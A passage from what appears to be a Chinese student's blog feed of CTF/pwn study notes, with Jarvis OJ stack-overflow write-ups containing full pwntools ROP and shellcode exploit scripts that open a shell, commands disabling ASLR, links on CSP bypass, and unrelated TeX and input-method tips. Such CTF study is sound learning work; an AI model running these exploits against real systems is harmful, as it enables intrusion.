      <content type="html"><![CDATA[<h2 id="做这个题目"><a href="#做这个题目" class="headerlink" title="做这个题目"></a>做这个题目</h2><p>题目地址: <a href="https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0" target="_blank" rel="external">https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0</a></p>
<p>描述: nc pwn2.jarvisoj.com 9880</p>
<h2 id="pwn入门"><a href="#pwn入门" class="headerlink" title="pwn入门"></a>pwn入门</h2><p><code>ida</code>看一下有一个<code>read(0, &amp;buf, 0x100u);</code><br><code>checksec</code>一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Arch:     i386-32-little</div><div class="line">RELRO:    Partial RELRO</div><div class="line">Stack:    No canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure></p>
<p>就开启了<code>NX</code><br>这题好像是顺着蒸米的一步步x64那个leak来的<br>因为没有libc，所以要leak出system，并且在bss段上构造<code>/bin/sh</code></p>
<p>先gdb一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern offset 0x41416d41</div><div class="line">1094806849 found at offset: 140</div></pre></td></tr></table></figure></p>
<p><code>readelf -S</code>找到<code>bss</code>段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[25] .bss              NOBITS          0804a024</div></pre></td></tr></table></figure></p>
<p>mark下 <code>bss_addr = 0x0804a024</code></p>
<p>在执行完<code>read</code>之后我们要执行<code>system(&#39;/bin/sh&#39;)</code>，read的参数是三个<br>所以为了平衡堆栈，我们找到<code>pop pop pop ret</code>这样的gadget<br><code>objdump -D pwnfile | cat -n | grep pop</code><br>=&gt; <code>cat -n</code>是对输出输出的行从1开始编号,可以看得出是不是相邻的指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">425	 8048508:	5b                   	pop    %ebx</div><div class="line">426	 8048509:	5e                   	pop    %esi</div><div class="line">427	 804850a:	5f                   	pop    %edi</div><div class="line">428	 804850b:	5d                   	pop    %ebp</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>好了一下找到了4个就可以构造rop了,(一般就是某个函数在返回前要恢复现场时候的pop数次+ret)</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># p = process('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0')</span></div><div class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</div><div class="line"></div><div class="line">vuln_addr = <span class="number">0x0804844B</span></div><div class="line">pppr_addr = <span class="number">0x08048509</span> <span class="comment">#pop pop pop ret</span></div><div class="line">bss_addr  = <span class="number">0x0804a024</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0'</span>)</div><div class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</div><div class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">    payload1 = <span class="string">'A'</span> * <span class="number">140</span> + p32(plt_write) + p32(vuln_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</div><div class="line">    p.send(payload1)</div><div class="line">    data = p.recv(<span class="number">4</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[-] %#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">'./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0'</span>)) <span class="comment"># important</span></div><div class="line"></div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) <span class="comment"># leak addr of system~~</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[+] get the addr of system"</span></div><div class="line"></div><div class="line">payload2 = <span class="string">'a'</span> * <span class="number">140</span> + p32(plt_read) + p32(pppr_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) <span class="comment"># read(1, bss_addr, 8) ret to `pop pop pop ret`</span></div><div class="line">payload2 += p32(system_addr) + p32(vuln_addr) + p32(bss_addr) <span class="comment"># system('/bin/sh') ret to vulnfunction</span></div><div class="line"></div><div class="line">p.send(payload2)</div><div class="line">p.send(<span class="string">'/bin/sh\0'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>拿到flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ ls</div><div class="line">flag</div><div class="line">level4</div><div class="line">$ cat flag</div><div class="line">CTF&#123;882130cf51d65fb705440b218e94e98e&#125;</div><div class="line">$ <span class="built_in">exit</span></div></pre></td></tr></table></figure></p>
<h2 id="还有一个"><a href="#还有一个" class="headerlink" title="还有一个"></a>还有一个</h2><p>我本地始终无法复现，真是崩溃TAT<br>无论是直接process还是用socat,poc一跑就会出现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exited on signal 11</div></pre></td></tr></table></figure></p>
<p>之类的错误</p>
<h2 id="看到了关于DynELF的相关"><a href="#看到了关于DynELF的相关" class="headerlink" title="看到了关于DynELF的相关"></a>看到了关于<code>DynELF</code>的相关</h2><p>muhe 的 <code>what DynELF does basically</code><a href="http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/" target="_blank" rel="external">http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/</a><br>mark 一下 认真学习一下</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门3]]></title>
      <url>/2017/05/05/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A83/</url>
      <content type="html"><![CDATA[<blockquote>
<p>不知道为什么题目在我电脑上都无法复现，崩溃.jpg</p>
</blockquote>
<p>还是上次的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    vulnerable_function();</div><div class="line">    write(STDOUT_FILENO, <span class="string">"Hello, world\n"</span>, <span class="number">13</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="关闭ASLR和stack-protector-意思是栈段没办法执行了"><a href="#关闭ASLR和stack-protector-意思是栈段没办法执行了" class="headerlink" title="关闭ASLR和stack protector, 意思是栈段没办法执行了"></a>关闭ASLR和stack protector, 意思是栈段没办法执行了</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./level2'</span>)</div><div class="line">system_ret = xxx    <span class="comment"># 开始漏掉了这个</span></div><div class="line">system_addr = xxx</div><div class="line">binsh_addr = xxx</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span> * <span class="number">140</span> <span class="comment"># 覆盖缓冲区</span></div><div class="line">payload += p32(system_ret) <span class="comment">#用system的地址覆盖vulner的返回地址，以跳到system上</span></div><div class="line">payload += p32(system_addr) <span class="comment"># 函数调用地址和函数参数之间是隔着一个函数返回地址的，开始忘记了==!i'm good vegetable</span></div><div class="line">payload += p32(binsh_addr) <span class="comment"># system 的参数</span></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="开启ASLR，仍然是上面的level2"><a href="#开启ASLR，仍然是上面的level2" class="headerlink" title="开启ASLR，仍然是上面的level2"></a>开启ASLR，仍然是上面的level2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo -s</div><div class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
<p>可以通过多次的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /proc/[pid of level2]/maps</div></pre></td></tr></table></figure></p>
<p>来看到ASLR确实起作用了</p>
<p>思路是leak出<code>libc.so</code>出某些函数的地址，然后算偏移量以得到<code>system()</code>和<code>bin/sh</code>地址</p>
<p>根据人家所说<br>Program Image是<code>Unrandomized</code>的<br><code>random</code>的是<code>libc</code>,<code>stack</code>和<code>heap</code>这些</p>
<p>可以用<code>write@plt</code>来把<code>write</code>(lib.c)里的地址link出来<br>然后根据lib.c里<code>write</code>和<code>system</code>之间的偏移算出来<code>system</code><br>后就OK了</p>
<p>另外<code>ldd</code>可以查看调用的动态链接库</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[objdump]]></title>
      <url>/2017/05/04/objdump/</url>
      <content type="html"><![CDATA[<p>常用<br><code>objdump -d example.o</code> 查看汇编</p>
<p><code>objdump -S example.o</code> 编译的时候要开<code>-g</code>, 可以c和汇编对照，不过感觉好鸡肋，没看出来是个怎么对照法</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn入门2]]></title>
      <url>/2017/04/29/pwn%E5%85%A5%E9%97%A82/</url>
      <content type="html"><![CDATA[<p>代码是这个<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vunerable_function</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    vunerable_function();</div><div class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>编译的时候关掉了一切保护措施<code>balabala -o level1</code></p>
<p>然后</p>
<ol>
<li><p>打开gdb</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: gdb ./level1</div></pre></td></tr></table></figure>
</li>
<li><p>跑一个150长的字符串</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern create 150</div><div class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>跑一下程序，把字符串输进去，得到崩溃时候的无效返回地址</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Stopped reason: SIGSEGV</div><div class="line">0x41416d41 in ?? ()</div></pre></td></tr></table></figure>
</li>
<li><p>看看这个字符串<code>0x41416d41</code>(<code>AmAA</code>)在输入的哪个位置上(这里开始有疑问，后来明白了)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pattern offset 0x41416d41</div></pre></td></tr></table></figure>
<p> 或者</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pattern offset &apos;AmAA&apos;</div></pre></td></tr></table></figure>
<p> 不是</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pattern offset &apos;AAmA&apos;</div></pre></td></tr></table></figure>
<p> 哦<br> 因为这里是小端<code>0x41416d41</code>实际上意思是以此出现了<code>0x41</code>, <code>0x6d</code>, <code>0x41</code>, <code>0x41</code> ，从低的地方往高的地方数数哦,所以对应的是字符串<code>AmAA</code></p>
</li>
<li><p>得到了偏移量</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern offset &apos;0x41416d41&apos;</div><div class="line">1094806849 found at offset: 140</div></pre></td></tr></table></figure>
</li>
<li><p>接下来就是通过贮储文件得到正确的要跳转到的shellcode的位置，前面的过程相当于得知了shellcode的格式，即相对位置(shellcode + padding + ret) 其中shellcode和padding共长140，<code>ret</code>处填shellcode的起始位置，即为报错时候的<code>$esp - 140 -4</code>，但这是个相对位置，我们得得到程序运行时候的shellcode的绝对位置，就是栈上的某一块位置，本来的话，我们在调试的时候，出现<code>Stopped reason: SIGSEGV 0x41416d41 in ?? ()</code> 的时候就可以通过<code>x/10s $esp-144</code>就可以看到我们shellcode的地址</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/10s $esp-144</div><div class="line">0xffffcb50:	&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n\377&quot;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>这里得到shellcode的地址为<code>0xffffcb50</code>,但实际上有个问题，据说gdb调试的时候会影响栈地址，和不用gdb的时候不一样，我的天，，，所以要正常运行程序生成贮储文件来找出正确的地址</p>
<pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">ulimit</span> -c unlimited</div><div class="line">sudo sh -c <span class="string">'echo "tmp/core.%t" &gt; /proc/sys/kernel/core_pattern'</span></div></pre></td></tr></table></figure>
</code></pre><p>大概是设置转储文件名字格式<br>之后运行我们的程序，输入长字符串</p>
<pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">haibin$: ./level1</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....懒得帖了</div><div class="line">Segment fault(core dump)</div><div class="line">haibin$: gdb level1 /tmp/core.xxxxxxx</div><div class="line">....各种信息</div><div class="line">Program terminated with signal SIGSEGV, Segmentation fault.</div><div class="line">\<span class="comment">#0  0x41416d41 in ?? ()</span></div><div class="line">gdb-peda$ x/10s <span class="variable">$esp</span>-144</div><div class="line">0xffffcb90:	<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n\377"</span></div></pre></td></tr></table></figure>
</code></pre><ol>
<li><p>得到了我们要的地址<code>0xffffcb90</code>(这个地址确实和开gdb的不一样，开gdb的地址大概是<code>0xffffcb50</code>)，然后就能写poc了</p>
</li>
<li><p>写poc</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#encoding: utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p = process('./level1')</span></div><div class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">123456</span>)</div><div class="line">ret = <span class="number">0xffffcb90</span>   </div><div class="line"></div><div class="line"><span class="comment">#md , shou qiao hao lei a,我从网上抄的shellcode，感觉好像其实不能用</span></div><div class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></div><div class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></div><div class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></div><div class="line"></div><div class="line">payload = shellcode + <span class="string">'A'</span> * (<span class="number">140</span> - len(shellcode)) + p32(ret) <span class="comment"># 140 + 4 没毛病</span></div><div class="line"><span class="keyword">print</span> payload</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#|-----------payload---------|</span></div><div class="line"><span class="comment">#|---------------------------|</span></div><div class="line"><span class="comment">#|140 bytes          |4 bytes|</span></div><div class="line"><span class="comment">#|---------------------------|</span></div><div class="line"><span class="comment">#|shellcode + padding|ret    |</span></div><div class="line"><span class="comment">#|---------------------------|</span></div></pre></td></tr></table></figure>
<ol>
<li>写好跑一下，应该就能getshell了，但我好像并没有成功，不知道为什么，但大概了解了整个过程</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[checksec]]></title>
      <url>/2017/04/29/checksec-1/</url>
      <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="???"></a>???</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c</div></pre></td></tr></table></figure>
<p>checksec 一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[*] &apos;/home/haibin/ctf/pwn/rop/level1&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x8048000)</div><div class="line">    RWX:      Has RWX segments</div></pre></td></tr></table></figure></p>
<p><code>-m32</code>是要生成<code>32位</code>程序</p>
<ul>
<li><code>checksec</code>结果里的<code>Arch:     i386-32-little</code> 代表 32位<br><code>-fno-stack-protector</code> 禁用了<code>stack-protector</code> 栈溢出保护机制</li>
<li>看到<code>Stack: Canary xxx</code> ,传说中的<code>Canary</code>金丝雀，如果有的话可以用来防御栈溢出<br><code>-z execstack</code> 开启栈上可执行 </li>
<li>看结果里有 <code>RWX: Has RWX segments</code>而且<code>NX: NX disabled</code></li>
</ul>
<h2 id="直接生成的，不关闭保护措施的"><a href="#直接生成的，不关闭保护措施的" class="headerlink" title="直接生成的，不关闭保护措施的"></a>直接生成的，不关闭保护措施的</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -o level1-plus-32 level1.c</div></pre></td></tr></table></figure>
<p>checksec一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] &apos;/home/haibin/ctf/pwn/rop/level1-plus-32&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure></p>
<p><code>NX/DEP</code> 可以让堆栈标记为不可执行,这里<code>NX enabled</code>了，所以没有发现<code>RWX segment</code><br><code>Canary</code> 金丝雀，堆栈的局部变量和返回地址之间保存的一个随机值(感觉像是Cookie一样)</p>
<h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">haibin$: sudo -s</div><div class="line">root\<span class="comment">#: echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">root\<span class="comment">#: exit</span></div></pre></td></tr></table></figure>
<p>这个和checksec没什么关系， ASLR是系统的功能</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mark个qq的API]]></title>
      <url>/2017/04/25/mark%E4%B8%AAqq%E7%9A%84API/</url>
      <content type="html"><![CDATA[<ol>
<li><a href="http://r.pengyou.com/fcg-bin/cgi_get_portrait.fcg?uins=QQ&amp;get_nick=1" target="_blank" rel="external">http://r.pengyou.com/fcg-bin/cgi_get_portrait.fcg?uins=QQ&amp;get_nick=1</a> 获取空间头像，QQ昵称 </li>
<li><a href="http://qlogo1.store.qq.com/qzone/QQ/QQ/100" target="_blank" rel="external">http://qlogo1.store.qq.com/qzone/QQ/QQ/100</a> 获取空间头像</li>
<li><a href="http://q2.qlogo.cn/headimg_dl?dst_uin=QQ&amp;spec=40" target="_blank" rel="external">http://q2.qlogo.cn/headimg_dl?dst_uin=QQ&amp;spec=40</a> 获取qq头像</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> API </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tex 中文问题]]></title>
      <url>/2017/04/25/tex-%E4%B8%AD%E6%96%87%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>以前只是排过tex的英文，，还比较友好</p>
<p>试了下中文报了一万个错误，大概找到了一种解决方法</p>
<blockquote>
<p>卸载掉texlive2015</p>
</blockquote>
<p>开玩笑的</p>
<p>是用<code>xeCJK</code>宏包</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">\<span class="name">documentclass</span><span class="string">&#123;article&#125;</span></span>  </div><div class="line"><span class="tag">\<span class="name">usepackage</span><span class="string">&#123;xeCJK&#125;</span></span></div><div class="line"><span class="tag">\<span class="name">setCJKmainfont</span><span class="string">&#123;WenQuanYi Micro Hei&#125;</span></span></div><div class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;document&#125;</span></span>  </div><div class="line">海滨翘了下午的数据挖掘课</div><div class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;document&#125;</span></span></div></pre></td></tr></table></figure>
<p>这里<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">\<span class="name">setCJKmainfont</span><span class="string">&#123;WenQuanYi Micro Hei&#125;</span></span></div></pre></td></tr></table></figure></p>
<p>可以用其他系统装了的支持中文的字体</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">fc</span>-list :lang=zh-cn</div></pre></td></tr></table></figure>
<p>这里有个空格的，哥</p>
<p>就酱紫</p>
]]></content>
      
        
        <tags>
            
            <tag> tex </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSP]]></title>
      <url>/2017/04/24/CSP/</url>
      <content type="html"><![CDATA[<p>大佬的CSP全家桶，看到好的再贴过来，把这几篇先看完<br><a href="http://lorexxar.cn/2016/08/08/ccsp/" target="_blank" rel="external">http://lorexxar.cn/2016/08/08/ccsp/</a><br><a href="http://lorexxar.cn/2017/02/16/cdn-bypass-csp/" target="_blank" rel="external">http://lorexxar.cn/2017/02/16/cdn-bypass-csp/</a><br><a href="http://lorexxar.cn/2016/04/20/gif-ccsp/" target="_blank" rel="external">http://lorexxar.cn/2016/04/20/gif-ccsp/</a><br><a href="http://lorexxar.cn/2016/04/08/input-bypasscsrf/" target="_blank" rel="external">http://lorexxar.cn/2016/04/08/input-bypasscsrf/</a></p>
<p>大佬多次提到的<code>&lt;link rel=&quot;prefetch&quot; herf=&quot;xxxxxxx&quot;&gt;</code> mark一下先</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iframe 跨域]]></title>
      <url>/2017/04/24/iframe-%E8%B7%A8%E5%9F%9F/</url>
      <content type="html"><![CDATA[<p>看了0ctf跨域xss的题目还是没太看懂</p>
<p>看大家纷纷使用iframe跨域。。并不太懂</p>
<p>搜了几篇文章学习一下</p>
<p>iframe xss<br><a href="http://www.cnblogs.com/xiaoheimiaoer/p/4418357.html" target="_blank" rel="external">http://www.cnblogs.com/xiaoheimiaoer/p/4418357.html</a></p>
<p>parent top self<br><a href="http://blog.csdn.net/zdwzzu2006/article/details/6047632" target="_blank" rel="external">http://blog.csdn.net/zdwzzu2006/article/details/6047632</a></p>
<p>js 跨域<br><a href="https://segmentfault.com/a/1190000003642057" target="_blank" rel="external">https://segmentfault.com/a/1190000003642057</a></p>
<p>跨域<br><a href="http://blog.csdn.net/mevicky/article/details/51404610" target="_blank" rel="external">http://blog.csdn.net/mevicky/article/details/51404610</a></p>
<p>windows.open<br><a href="http://www.cnblogs.com/xiaoheimiaoer/p/4734977.html" target="_blank" rel="external">http://www.cnblogs.com/xiaoheimiaoer/p/4734977.html</a></p>
<p>MD, 我好菜啊</p>
<p>Bypass CSP<br><a href="http://lorexxar.cn/2016/10/28/csp-then/" target="_blank" rel="external">http://lorexxar.cn/2016/10/28/csp-then/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> 周一 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sogou 日常不能用]]></title>
      <url>/2017/04/23/sogou-%E6%97%A5%E5%B8%B8%E4%B8%8D%E8%83%BD%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>有的时候啊，这个搜狗输入法，他就莫名只显示当前输入的字母，然后并没有侯选框给你选汉字，太坑了，是不是因为我用<code>Ubuntu 16.04</code>的原因</p>
<a id="more"></a>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><ol>
<li><p>删掉这几个文件夹</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rm -rf ~/.config/sogou-qimpanel</div><div class="line">rm -rf ~/.config/SogouPY</div><div class="line">rm -rf ~/.config/SogouPY.users</div></pre></td></tr></table></figure>
</li>
<li><p>重装sogou</p>
<ul>
